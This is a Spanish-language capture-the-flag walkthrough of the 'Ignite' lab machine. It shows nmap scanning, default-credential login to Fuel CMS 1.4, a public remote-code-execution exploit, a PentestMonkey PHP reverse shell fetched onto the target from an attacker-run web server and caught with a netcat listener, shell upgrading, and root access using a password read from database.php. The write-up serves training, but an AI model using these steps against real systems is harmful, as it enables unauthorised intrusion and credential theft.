# IGNITE

## Reconocimiento

Para comenzar, haremos un Nmap para sacar los puertos abietos, versiones, etc.

``nmap -T4 --min-rate=10000 -p- -A IP_MAQUINA_ATACADA``

1. -T4 -> Dedique un máximo de 4 segundos a escanear un solo puerto.
2. --min-rate=10000 -> Envía 10000 paquetes por segundo.
3. -p- -> Escanea todos los puertos.
4. -A -> Permite un escaneo agresivo.

![Imagen1](/Iginite/assets/2025-02-06%2018_06_24-KaliLinux-Hacking%20-%20VMware%20Workstation.png)

En este escaneo podemos ver que solo tenemos un puerto abierto que es 80 / tcp - HTTP - que ejecuta el servidor web Apache con Fuel CMS.

Tambien podemos ver que la única entrada no permitida es la página de inicio de sesión para el CMS ``robots.txt/fuel``.

## Explotacion de la Web

Visitemos el sitio web que se ejecuta en el puerto 80.

![Imagen2](/Iginite/assets/Captura%20de%20pantalla%202025-02-06%20194100.png)

Luego, entraremos en la pagina web predeterminada de Fuel CMS e intentamos iniciar sesión.

![Imagen3](/Iginite/assets/2025-02-06%2018_08_44-KaliLinux-Hacking%20-%20VMware%20Workstation.png)

Primero probaremos con el nombre de usuario y la contraseña predeterminados ``admin:admin``. Y obtendremos el acceso al panel de control.

![Imagen4](/Iginite/assets/2025-02-06%2018_09_24-KaliLinux-Hacking%20-%20VMware%20Workstation.png)

Si hacemos click en "Click here for your site documentation", nos eviara a una pagina web en la que nos pondra la version del FUEL CMS, que es la 1.4.

![Imagen5](/Iginite/assets/2025-02-06%2018_11_28-KaliLinux-Hacking%20-%20VMware%20Workstation.png)

Si buscamos en Google alguna vulneravilidad para esta verison de Fuel CMS, encontramos que hay una para la version 1.4.1, por lo que la descargamos y la provaremos.

![Imagen6](<2025-02-06 18_14_27-KaliLinux-Hacking - VMware Workstation.png>)

Para ejecutarla podremos el comando siguiente comando de python:

``python3 50477.py -u http://DIRECCION_DE_LA_WEB_ATACADA``

![alt text](<2025-02-06 18_38_46-KaliLinux-Hacking - VMware Workstation.png>)

Consultando la hoja de trucos de PentestMonkey, podemos descargar una reverse shell en php, que vamos a descargar con un ``wget`` copiando el enlace desde la pagina web oficial.

`http://pentestmonkey.net/tools/php-reverse-shell`

![alt text](<2025-02-06 18_39_55-KaliLinux-Hacking - VMware Workstation.png>)

``wget http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz``

![alt text](<2025-02-06 18_41_01-KaliLinux-Hacking - VMware Workstation.png>)

Al desconprimir el archivo que nos hemos descargado, nos dejara una carpeta en la que dentro tendremos un .php que es la reverse shell, la cual vamos a entrar a modificar y cambiaremos un par de cosas.

![alt text](<2025-02-06 18_42_14-KaliLinux-Hacking - VMware Workstation.png>)

Lo primero que cambiaremos es la direccion ip, la cual podremos la disccion ip de nuestra maquina Kali, y luego tendremos que cambiar el puerto a un puerto que tengamos libre.

```php
$ip = IP_MAQUINA_ATACANTE;
$port = PUERTO_LIBRE;
```

![alt text](<2025-02-06 18_42_44-KaliLinux-Hacking - VMware Workstation.png>)

Ahora entraremos en la carpeta donde esta la reverse shell, y ejecutaremos el siguiente comando para levantar un servidor web simple en el puerto 80 utilizando el módulo http.server de Python.

``python3 -m http.server 80``

![alt text](<2025-02-06 18_48_50-KaliLinux-Hacking - VMware Workstation.png>)

Ahora volviendo a la shell que tenemos abierta en el servidor, podremos un ``wget`` para descargarmos la reverse shell dentro del servidor, y poder posteriormente ejecutarla.

![alt text](<2025-02-06 18_50_09-KaliLinux-Hacking - VMware Workstation.png>)

Antes de ejecutar la reverse shell, vamos a poner en escucha el puerto que configuramos anteriormente en el archivo ``.php``.

`nc -nlvp PUERTO_CONFIGURADO`

![alt text](<2025-02-06 19_01_48-KaliLinux-Hacking - VMware Workstation.png>)

Y ahora para ejecutar la reverse shell vamos a poner la direccion de la pagina web ``/php-reverse-shell.php`` o el nombre que tenga el archivo.

`http://DIRECCION_DE_LA_WEB_ATACADA/NOMBRE_ARCHIVO_REVERSE_SHELL`

![alt text](<2025-02-06 19_07_51-KaliLinux-Hacking - VMware Workstation.png>)

## Comprometer la Maquina

Y si todo a funcionado correctamente, en la terminal en la que teniamos escuchando por el puerto configurado, se nos habra abierto una terminal en la que si por ejemplo escribimos `whoami` nos dira que estamos en el usuario ``www-data``.

![alt text](<2025-02-06 19_08_15-KaliLinux-Hacking - VMware Workstation.png>)

Ya tenemos la reverse shell, pero no es del todo amigable en este momento. Así que vamos mejorala, para ello ejecutamos las siguientes lineas:

```py

python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

<CTRL> + Z

stty raw -echo; fg

```

![alt text](<2025-02-06 19_09_34-KaliLinux-Hacking - VMware Workstation.png>)

Y ahora tenemos un shell estable con autocompletado de pestañas y otras características.

Ahora vamos a buscar la primera flag, la cual se encuentra en el ``home`` del usuario en el que estamos.

![alt text](<2025-02-06 19_10_53-KaliLinux-Hacking - VMware Workstation.png>)

Por lo que le hacemos un ``cat`` y la pemos ver.

## Escalada de Privilegios

Revisando la página predeterminada de Fuel CMS, se especifica que incluya el nombre de usuario y la contraseña dentro del archivo de configuracion `database.php` que se encuentra en la ruta `fuel/application/config/database.php`.

![alt text](<2025-02-06 19_11_51-KaliLinux-Hacking - VMware Workstation.png>)


![alt text](<2025-02-06 19_15_35-KaliLinux-Hacking - VMware Workstation.png>)

Por lo que entramos alli, y le aremos un ``cat`` al archivo `database.php`.

`cat database.php | grep "pass"`

![alt text](<2025-02-06 19_16_22-KaliLinux-Hacking - VMware Workstation.png>)

Ahora nos registraremos como root, para ello podremos el siguiente comando:

`su -`

Y podremos la contraseña que hemos visto anteriormente en el archivo `database.php`.

`mememe`

![alt text](<2025-02-06 19_19_22-KaliLinux-Hacking - VMware Workstation.png>)

Haciendo un ls vemos que ya tenemos la flag aqui, por lo que le aremos un cat y ya la podremos ver.

![alt text](<2025-02-06 19_19_53-KaliLinux-Hacking - VMware Workstation.png>)